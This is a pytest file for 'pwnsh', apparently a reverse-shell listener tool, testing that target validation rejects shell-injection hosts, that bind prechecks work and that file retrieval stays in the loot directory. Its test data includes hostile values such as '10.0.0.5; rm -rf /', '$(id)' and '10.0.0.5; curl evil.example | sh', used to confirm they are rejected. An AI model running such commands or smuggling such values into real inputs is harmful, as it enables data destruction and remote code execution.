"""Tests for the security/robustness hardening:

* ``validate_target`` rejects shell-injection-prone hosts and bad ports, and
  ``callback_pty_payload`` refuses to build a payload from them.
* the IPv6-aware pre-flight bind check.
* ``/get`` never writes outside the loot dir, even for a degenerate remote path.
"""
from __future__ import annotations

import asyncio
import base64
import contextlib
import re
import socket

import pytest

from pwnsh.fingerprint import callback_pty_payload, validate_target
from pwnsh.listener import TCPListener
from pwnsh.session import SessionRegistry
from pwnsh.transfer import get_file


# ── validate_target ───────────────────────────────────────────────────
@pytest.mark.parametrize(
    "host",
    ["10.0.0.5", "attacker.example", "host-name_1.local", "::1", "fe80::1", "127.0.0.1"],
)
def test_validate_target_accepts_ips_and_hostnames(host):
    assert validate_target(host, 4444) is None


@pytest.mark.parametrize(
    "host",
    ["10.0.0.5; rm -rf /", "$(id)", "`id`", "a'b", 'a"b', "a b", "a|b", "a&b", "", "x" * 256],
)
def test_validate_target_rejects_injection_hosts(host):
    assert validate_target(host, 4444) is not None


@pytest.mark.parametrize("port", [0, -1, 65536, 70000, "abc", None])
def test_validate_target_rejects_bad_ports(port):
    assert validate_target("10.0.0.5", port) is not None


def test_callback_pty_payload_raises_on_unsafe_host():
    with pytest.raises(ValueError):
        callback_pty_payload("10.0.0.5; curl evil.example | sh", 4444)


def test_callback_pty_payload_still_builds_for_clean_host():
    p = callback_pty_payload("10.0.0.5", 4444)
    assert "10.0.0.5" in p and "4444" in p


# ── IPv6-aware bind precheck ───────────────────────────────────────────
def test_check_bind_ok_on_free_port(free_port):
    from pwnsh.__main__ import _check_bind_or_die

    # Should return without raising/exiting.
    _check_bind_or_die("127.0.0.1", free_port)


def test_check_bind_supports_ipv6_loopback(free_port):
    from pwnsh.__main__ import _check_bind_or_die

    if not socket.has_ipv6:
        pytest.skip("platform has no IPv6")
    try:
        _check_bind_or_die("::1", free_port)
    except SystemExit:
        pytest.skip("IPv6 loopback not bindable in this environment")


def test_check_bind_exits_when_port_in_use():
    from pwnsh.__main__ import _check_bind_or_die

    holder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    holder.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    holder.bind(("127.0.0.1", 0))
    holder.listen(1)
    port = holder.getsockname()[1]
    try:
        with pytest.raises(SystemExit):
            _check_bind_or_die("127.0.0.1", port)
    finally:
        holder.close()


# ── /get path safety ───────────────────────────────────────────────────
def test_get_with_degenerate_remote_uses_safe_loot_name(loot_dir, free_port):
    payload = b"contents that came back for a rootish path\n"

    async def go():
        reg = SessionRegistry()
        listener = TCPListener(reg, host="127.0.0.1", port=free_port)
        await listener.start()
        try:
            r, w = await asyncio.open_connection("127.0.0.1", free_port)

            async def scripted():
                buf = b""
                try:
                    while True:
                        data = await r.read(8192)
                        if not data:
                            return
                        buf += data
                        text = buf.decode(errors="replace")
                        m_b = re.search(r"@@PWX_GET_BEGIN_[0-9a-f]+@@", text)
                        m_e = re.search(r"@@PWX_GET_END_[0-9a-f]+@@", text)
                        if m_b and m_e and b"<H>" not in buf:
                            b64 = base64.b64encode(payload).decode()
                            reply = m_b.group(0) + "\n" + b64 + "\n" + m_e.group(0) + "\n"
                            w.write(reply.encode())
                            await w.drain()
                            buf += b"<H>"
                except (asyncio.CancelledError, ConnectionResetError, OSError):
                    pass

            t = asyncio.create_task(scripted())
            await asyncio.sleep(0.1)
            s = reg.all()[0]
            res = await get_file(s, "/", timeout=5.0)
            t.cancel()
            with contextlib.suppress(BaseException):
                await t
            w.close()
            with contextlib.suppress(Exception):
                await w.wait_closed()
            return res, s.id
        finally:
            await listener.stop()

    res, sid = asyncio.run(go())
    assert res.ok, res.message
    assert res.path is not None
    assert res.path.name == f"download-{sid:04d}.bin"
    assert res.path.parent.name == f"session-{sid:04d}"
    assert res.path.read_bytes() == payload
